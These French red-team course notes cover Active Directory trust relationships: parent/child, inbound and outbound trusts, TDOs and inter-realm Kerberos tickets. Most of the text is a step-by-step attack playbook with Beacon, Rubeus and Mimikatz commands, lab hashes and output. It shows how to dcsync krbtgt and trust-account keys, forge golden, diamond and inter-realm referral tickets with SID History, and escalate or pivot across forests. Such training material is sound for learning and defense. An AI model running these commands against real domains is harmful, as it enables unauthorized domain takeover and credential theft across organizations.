# Théorie

De nombreux environnements Active Directory sont plus complexes qu'un simple domaine isolé. Ils entretiennent des relations d'approbation (trust) avec d'autres forêts et/ou domaines. Le but d'une relation d'approbation est de permettre à une forêt ou un domaine de partager ses ressources avec un autre. Ces relations peuvent exister entre domaines d'une même forêt, entre domaines de forêts différentes, et même entre forêts entières. Voici un résumé des types de relations d'approbation que vous rencontrerez le plus souvent :

![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/1e68ec5811cb75b51d2c443ffa6ba69e.png)

- **Parent/Child Trust** - une relation transitive, bidirectionnelle, créée automatiquement lorsqu'un nouveau domaine est ajouté à une arborescence existante.
- **Tree-Root Trust** - une relation transitive, bidirectionnelle, créée automatiquement lorsqu'une nouvelle arborescence de domaines est ajoutée à une forêt existante.
- **External Trust** - une relation non transitive, à sens unique ou bidirectionnelle, qui permet de partager des ressources entre domaines de forêts différentes.
- **Forest Trust** - une relation transitive, à sens unique ou bidirectionnelle, qui permet de partager des ressources entre différentes forêts.

## Transitivité

La _transitivité_ d'une relation d'approbation détermine si celle-ci doit s'étendre au-delà des deux parties qui l'ont établie. Imaginons un scénario où le Domaine A a une relation d'approbation explicite avec le Domaine B, et le Domaine B a une relation d'approbation explicite avec le Domaine C. Si ces relations étaient transitives, alors le Domaine A ferait aussi implicitement confiance au Domaine C.

![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/95aa151c7231d9cc09566d079d7d5f67.png)

## Direction de la relation d'approbation

La direction d'une relation d'approbation permet l'accès aux ressources dans un sens ou dans les deux. Une relation à sens unique entre le Domaine A et le Domaine B permettrait aux utilisateurs du Domaine A d'accéder aux ressources du Domaine B, mais les utilisateurs du Domaine B ne pourraient pas accéder aux ressources du Domaine A. Une relation bidirectionnelle permet évidemment l'accès aux ressources dans les deux sens.

Les relations à sens unique sont également qualifiées d'**inbound** (entrantes) ou d'**outbound** (sortantes) selon le côté de la relation où l'on se trouve. Dans l'exemple ci-dessous, la relation à sens unique est entrante du point de vue du Domaine A, et sortante du point de vue du Domaine C. Certaines documentations parlent alors de domaine **trusting** (approbateur) et de domaine **trusted** (approuvé). Ce qui prête à confusion, c'est que la direction de la relation est opposée à la direction de l'accès.

![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/b8c4c297c03fcaa48983ac438a55a77c.png)

Les relations bidirectionnelles n'existent pas réellement dans Active Directory : ce sont en fait deux relations à sens unique dans des directions opposées.

## Trusted Domain Objects

Les informations relatives à chaque relation d'approbation sont stockées dans Active Directory sous forme d'un Trusted Domain Object (TDO). Cela inclut le type de relation, sa transitivité, et le mot de passe partagé utilisé pour la créer. Le contrôleur de domaine principal du domaine approbateur change le mot de passe du TDO tous les 30 jours et le propage à un contrôleur de domaine du domaine approuvé. Les TDO peuvent être consultés en interrogeant la classe d'objet `trustedDomain`.

```
beacon> ldapsearch (objectClass=trustedDomain)
```

Les attributs importants sont :

- **cn** - le nom de domaine complet (FQDN) du domaine.
- **flatName** - le nom NetBIOS du domaine.
- **trustDirection** - indique la direction de la relation :
  - **0** - `TRUST_DIRECTION_DISABLED`
  - **1** - `TRUST_DIRECTION_INBOUND`
  - **2** - `TRUST_DIRECTION_OUTBOUND`
  - **3** - `TRUST_DIRECTION_BIDIRECTIONAL`
- **trustAttributes** - un ensemble d'indicateurs binaires (bitwise flags) définissant diverses propriétés de la relation. Les plus pertinents sont :
  - **1** - `TRUST_ATTRIBUTE_NON_TRANSITIVE`
  - **4** - `TRUST_ATTRIBUTE_QUARANTINED_DOMAIN`, ce qui signifie que le filtrage SID (SID filtering) est en place
  - **8** - `TRUST_ATTRIBUTE_FOREST_TRANSITIVE`, ce qui signifie que la relation est transitive entre deux forêts
  - **32** - `TRUST_ATTRIBUTE_WITHIN_FOREST`, ce qui signifie que la relation est entre deux domaines d'une même forêt
  - **64** - `TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL`, ce qui signifie que la relation est entre deux domaines de forêts différentes (le filtrage SID est également impliqué)

## Inter-Realm Tickets

Dans un même realm, un principal obtient un TGT auprès de son KDC et l'utilise pour demander des tickets de service. Entre deux realms, ça ne fonctionne pas directement : un TGT émis par le realm approuvé ne peut pas être déchiffré par le realm approbateur, puisqu'il ne connaît pas le secret krbtgt. C'est pour combler cet écart qu'une clé inter-realm est utilisée.

Toutes les relations parent/enfant d'une forêt partagent la même clé inter-realm — c'est ce qui rend les relations transitives. Chaque relation non transitive a sa propre clé.

Le client envoie d'abord un TGS-REQ à son propre KDC, avec son TGT normal, en visant un SPN du realm approbateur.

![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/1567a745828933ec174bc3ab39410b29.png)

Le KDC voit que le service est dans un autre realm et renvoie non pas un ticket de service, mais un **TGT inter-realm** (aussi appelé « referral » chez Microsoft) : un TGT du realm approuvé, chiffré avec la clé inter-realm au lieu du secret krbtgt. Son champ realm pointe vers le realm approuvé, mais son SPN vise le service krbtgt du realm approbateur.

![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/dbc49a9ef74bff26556d9a77e1609225.png)

Le client envoie ensuite ce TGT inter-realm dans un second TGS-REQ, cette fois directement au KDC du realm approbateur.

![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/c1a5029ef3dcc4368d9aac3fa0ea5317.png)

Ce KDC déchiffre le TGT avec sa copie de la clé inter-realm et renvoie enfin le ticket de service. Résumé du flux :

![](img/6e2d2d2de4a3668a1e8fea99314d9667%201.jpg)


La clé inter-realm est stockée comme mot de passe d'un compte de type `SAM_TRUST_ACCOUNT`, nommé d'après le NetBIOS du realm opposé (ex. `PARTNER$`). Invisible dans ADUC, mais trouvable via LDAP :

```
beacon> ldapsearch (samAccountType=805306370) --attributes samAccountName
```

Côté realm approuvé, la clé est lue depuis ce compte ; côté realm approbateur, elle est stockée directement dans le TDO.

# Résumé des cas possibles 

| Type de trust                | Position de l'attaquant        | Sens de l'accès          | Filtrage SID | Accès obtenu                                                                                                                                     |
| ---------------------------- | ------------------------------ | ------------------------ | ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| Parent/Child                 | Domaine enfant (DA local)      | Bidirectionnel transitif | Désactivé    | Enterprise Admins via SID History (golden ticket)                                                                                                |
| Inbound (trustDirection: 1)  | Domaine approuvé (trusted)     | Dans le sens de l'accès  | Activé       | Usurpation d'un foreign security principal ayant un accès légitime (via password ou forge d'un ticket inter-realm via le trust account (dcsync)) |
| Outbound (trustDirection: 2) | Domaine approbateur (trusting) | Contre-sens de l'accès   | Activé       | Privilèges Domain Users uniquement, via le trust account (primaryGroupID 513), en dcsync-ant son secret depuis le TDO                            |
# Parent/Child Trusts

Un ajout de domaine dans une arborescence crée automatiquement une relation transitive bidirectionnelle entre lui (l'enfant) et son parent. Comme ces relations sont transitives, il y a toujours une relation implicite bidirectionnelle entre tout domaine enfant, peu importe sa profondeur, et la racine de l'arborescence.

```
beacon> ldapsearch (objectClass=trustedDomain)

name: contoso.com
trustDirection: 3
trustAttributes: 32
flatName: CONTOSO
```

Un attaquant avec les droits domain admin sur un domaine enfant peut s'élever à enterprise admin sur la forêt, en forgeant un golden ticket incluant le SID d'un groupe privilégié du domaine parent (ex. enterprise admins) dans l'attribut SID History. À l'origine, SID History sert aux scénarios de migration : quand un utilisateur est déplacé d'un domaine à un autre, son ancien SID y est ajouté pour qu'il conserve l'accès aux ressources de l'ancien domaine.

Ce ticket peut être forgé entièrement hors ligne :

```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /nowrap
```

Où :
- `/aes256` est le hash AES du compte krbtgt du domaine enfant.
- `/user` est l'utilisateur à usurper.
- `/domain` est le domaine enfant.
- `/sid` est le SID du domaine enfant.
- `/sids` est la liste des SID à inclure dans le SID history du ticket.

(Le SID du domaine parent s'obtient via LDAP, en interrogeant un contrôleur de domaine du parent avec la base de requête sur son DN :)

```
beacon> ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
objectSid: S-1-5-21-3926355307-1661546229-813047887
```

Ou via la technique du diamond :

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
```

Où :
- `/tgtdeleg` récupère un TGT utilisable pour l'utilisateur courant.
- `/ticketuser` est l'utilisateur à usurper.
- `/ticketuserid` est le RID de l'utilisateur usurpé.
- `/sids` est la liste des SID à inclure dans le SID history du ticket.
- `/krbkey` est le hash AES256 du compte krbtgt du domaine enfant.

## Enumeration

1. Enumerate the trust.
```
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
```

2. Obtain the domain SID for the child domain.
```
ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
```

3. Obtain the SID for parent domain's Enterprise Admins group.
```
ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
```

## Credential Access

1. Impersonate a ``Domain Admin`` user.
2. Obtain the AES256 hash for the child domain's krbtgt account.
```
dcsync dublin.contoso.com DUBLIN\krbtgt
```
## Exploitation

1. On the Attacker Desktop, forge a golden ticket and output to a kirbi file.
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden
```

2. Inject the ticket into the Beacon session.
```
kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN TICKET]
```

3. Verify the ticket is in the session.
```
run klist
```

4. Access the parent domain's domain controller.
```
ls \\lon-dc-1\c$
```

---
# Inbound Trusts

Une relation à sens unique est créée quand on veut partager des ressources avec un domaine approuvé, sans que le domaine approbateur puisse accéder au sien (migrations, transferts de données, etc.).

```
beacon> ldapsearch (objectClass=trustedDomain)

name: partner.com
trustDirection: 1
trustAttributes: 8
flatName: PARTNER
```

Si l'attaquant est côté domaine approuvé, il est dans le sens de l'accès et peut donc atteindre des ressources du domaine approbateur. La stratégie consiste à trouver et usurper des principals du domaine approuvé disposant d'un accès légitime au domaine approbateur. Les golden tickets avec SID history ne fonctionnent pas ici : les external trusts appliquent le SID filtering, qui fait ignorer par le domaine approbateur tout SID qui ne lui est pas natif.

Le conteneur Foreign Security Principals contient les objets [foreignSecurityPrincipal](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/65f7d03b-8542-4a6f-8b42-ae5247f7656a), qui représentent les principals du domaine approuvé rendus membres de groupes du domaine approbateur. On peut l'énumérer depuis le domaine approuvé, via la relation entrante.

```
beacon> ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com

cn: S-1-5-4
cn: S-1-5-11
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=partner,DC=com, CN=Users,CN=Builtin,DC=partner,DC=com
cn: S-1-5-17
cn: S-1-5-9
cn: S-1-5-21-3926355307-1661546229-813047887-6102
memberOf: CN=Contoso Users,CN=Users,DC=partner,DC=com
retreived 5 results total
```

4 SID par défaut (`S-1-5-4`, `S-1-5-9`, `S-1-5-11`, `S-1-5-17`) ne présentent pas d'intérêt. Le reste, si. Ici, `S-1-5-21-3926355307-1661546229-813047887-6102` existe dans le domaine approuvé (_contoso.com_), probablement un groupe. On le résout par son SID :

```
beacon> ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102)

objectClass: top, group
cn: Partner Jump Users
member: CN=Polly Childs,CN=Users,DC=contoso,DC=com
distinguishedName: CN=Partner Jump Users,CN=Users,DC=contoso,DC=com
name: Partner Jump Users
objectSid: S-1-5-21-3926355307-1661546229-813047887-6102
sAMAccountName: Partner Jump Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=contoso,DC=com
```

Ce groupe de _contoso.com_ est membre d'un groupe de _partner.com_ (**Contoso Users**), utilisé pour assigner des privilèges aux utilisateurs étrangers - souvent visible via les GPO ou les groupes locaux des machines de _partner.com_.

```
beacon> ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=partner,DC=com --hostname partner.com

sAMAccountName: PAR-DC-1$
sAMAccountName: PAR-JMP-1$
retreived 2 results total
```

### Forging referral tickets

Avec des identifiants pour un principal éligible, on peut simplement l'usurper et laisser Windows gérer les tickets. Sinon, on peut forger manuellement un ticket inter-realm avec la clé inter-realm, récupérable en dumpant le compte de confiance depuis le domaine approuvé :

```
beacon> dcsync contoso.com CONTOSO\PARTNER$

Credentials:
  Hash NTLM: 6150491cceb080dffeaaec5e60d8f58d
    ntlm- 0: 6150491cceb080dffeaaec5e60d8f58d
    lm  - 0: a1542b43120fba746668d676b8e25f40
```

Ces hashes s'utilisent avec la commande `silver` de Rubeus (les trusts utilisent RC4 par défaut, donc le NTLM suffit) :

```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap
```

En offline, veillez à bien renseigner les groupes de l'utilisateur plutôt que de vous fier aux valeurs par défaut de Rubeus (ou forgez le ticket en ligne avec `/ldap`).

Ce TGT inter-realm forgé sert ensuite à demander des tickets de service via `asktgs` :

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:doIFM[...snip...]mNvbQ== /nowrap
```

Où :
- `/service` est le service cible dans le domaine approbateur.
- `/dc` est un contrôleur de domaine du domaine approbateur.
- `/ticket` est le TGT inter-realm.


## Enumeration

1. Interact with the medium-integrity Beacon and enumerate the trust.
```
ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname
```
2. Enumerate the Foreign Security Principals Container of the foreign domain.
```
ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com
```
3. Identify what that local SID is.
```
ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102) --attributes samAccountType,distinguishedName
```
4. Enumerate members of that group.
```
ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName
```
5. Find a domain controller in the foreign domain.
```
nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV
```

## Discovery

1. List GPOs.
```
ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes displayName,gPCFileSysPath
```
2. Download the GPO's _GptTmpl.inf_ file.
```
download \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
```
3. Sync it to your Attacker desktop and open it in Notepad.
> It will show that the SID S-1-5-21-4244029708-1901239654-2578485347-1104 is a member of S-1-5-32-544, which is the local administrators group.

4. You can confirm that this is the "Contoso Users" group and that it has the SID from CONTOSO, _S-1-5-21-3926355307-1661546229-813047887-6102_, is a member.
```
ldapsearch (objectSid=S-1-5-21-4244029708-1901239654-2578485347-1104) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes samAccountType,samAccountName,member
```
5. Find where that GPO is linked.
```
ldapsearch (&(|(objectClass=organizationalUnit)(objectClass=domain))(gPLink=*{DFE606B4-CA59-4AD6-9BCE-55AF35888129}*)) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes objectClass,name
```
6. Find what computers exist in the foreign domain.
```
ldapsearch (samAccountType=805306369) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes distinguishedName
```

## Exploitation

1. Use the high-integrity Beacon to impersonate the _dyork_ user (who is a domain admin in the current domain).
2. DCSync _rsteel_'s AES256 hash.
```
dcsync contoso.com CONTOSO\rsteel
```
3. Obtain a TGT for _rsteel_ (using aes256_hmac) -> (you could just inject TGT and let windows ask TGS)
```
krb_asktgt /user:rsteel /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
```
4. Use the TGT to request an inter-realm referral ticket.
```
krb_asktgs /service:krbtgt/partner.com /ticket:[TGT]
```
5. Use the inter-realm ticket to request a service ticket for CIFS on _par-jmp-1_.
```
krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:[INTER-REALM]
```
6. Use the service ticket to access the service in the trusting domain.
```
ls \\par-jmp-1.partner.com\c$
```

---
# Outbound Trusts

Un attaquant peut aussi se retrouver du « mauvais » côté d'une relation à sens unique : le domaine approbateur. Il est alors à contre-sens de l'accès et ne peut pas, par design, atteindre le domaine approuvé — ces forest trusts sont de vraies frontières de sécurité.

```
beacon> ldapsearch (objectClass=trustedDomain)

name: contoso.com
trustDirection: 2
trustAttributes: 8
flatName: CONTOSO
```

Toute tentative d'énumération du domaine étranger échoue généralement avec l'erreur 49 (« invalid credentials »), ce qui rend l'énumération basique impossible.

```
beacon> ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com

Binding to contoso.com
[-] Bind Failed: 49
```

Sous le capot, un TGS-REQ pour _krbtgt/CONTOSO.COM_ arrive sur le KDC de _partner.com_, qui renvoie une erreur `KDC_ERR_S_PRINCIPAL_UNKNOWN` : il n'y a pas de referral, contrairement à ce qui se passerait côté domaine approuvé.

Si on dispose d'identifiants pour un principal du domaine approuvé, on peut en revanche l'usurper et accéder à ses ressources directement via le réseau.

```
beacon> make_token CONTOSO\Administrator Passw0rd!

[+] Impersonated CONTOSO\Administrator (netonly)

beacon> ls \\lon-dc-1.contoso.com\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 09:20:24   PerfLogs
          dir     03/18/2025 13:18:21   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     03/18/2025 13:18:02   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/29/2025 10:42:20   System Volume Information
          dir     01/24/2025 13:33:21   Users
          dir     01/24/2025 13:49:56   Windows
 12kb     fil     03/18/2025 05:28:14   DumpStack.log.tmp
 1gb      fil     03/18/2025 05:28:14   pagefile.sys
```

Ici, le client effectue les échanges de tickets directement avec le KDC du domaine approuvé. Or, le seul compte du domaine approuvé pour lequel on dispose forcément d'identifiants, c'est le trust account : son mot de passe est la clé inter-realm partagée, dont le domaine approbateur garde une copie dans le TDO.

Pour l'obtenir, on récupère d'abord l'`objectGUID` du TDO :

```
beacon> ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID

name: contoso.com
objectGUID: 288d9ee6-2b3c-42aa-bef8-959ab4e484ed
```

Puis on le `dcsync` via le paramètre `/guid` de Mimikatz :

```
beacon> mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}

** TRUSTED DOMAIN - Antisocial **

Partner              : contoso.com
 [ Out ] CONTOSO.COM -> PARTNER.COM
    * aes256_hmac       cc19dd9022fb33da79820c340e7c96765f237aa1a5a9dfe889a8f27af12c7a34
    * aes128_hmac       4929a44176077b570d1b6f1eae4f9fbb
    * rc4_hmac_nt       6150491cceb080dffeaaec5e60d8f58d

 [Out-1] CONTOSO.COM -> PARTNER.COM
    * aes256_hmac       cc19dd9022fb33da79820c340e7c96765f237aa1a5a9dfe889a8f27af12c7a34
    * aes128_hmac       4929a44176077b570d1b6f1eae4f9fbb
    * rc4_hmac_nt       6150491cceb080dffeaaec5e60d8f58d
```

`[Out]` et `[Out-1]` sont respectivement la clé actuelle et la précédente (identiques ici car les 30 jours de rotation ne sont pas écoulés). Avec le RC4, on demande un TGT au domaine approuvé :

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /dc:lon-dc-1.contoso.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap

[+] TGT request successful!

  ServiceName              :  krbtgt/CONTOSO.COM
  UserName                 :  PARTNER$ (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
```

Une fois ce ticket injecté dans une session logon, on peut énumérer le domaine approuvé :

```
beacon> run klist

#0> Client: PARTNER$ @ CONTOSO.COM
    Server: krbtgt/CONTOSO.COM @ CONTOSO.COM

beacon> ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com

name: contoso
objectSid: S-1-5-21-3926355307-1661546229-813047887
retreived 1 results total
```

Cela fonctionne car le primaryGroupID du trust account est 513 : il hérite donc des privilèges de Domain Users sans en être membre explicite (héritage du support POSIX). On peut alors énumérer le domaine approuvé pour y chercher des vulnérabilités (comptes roastables, instances ADCS, etc.).
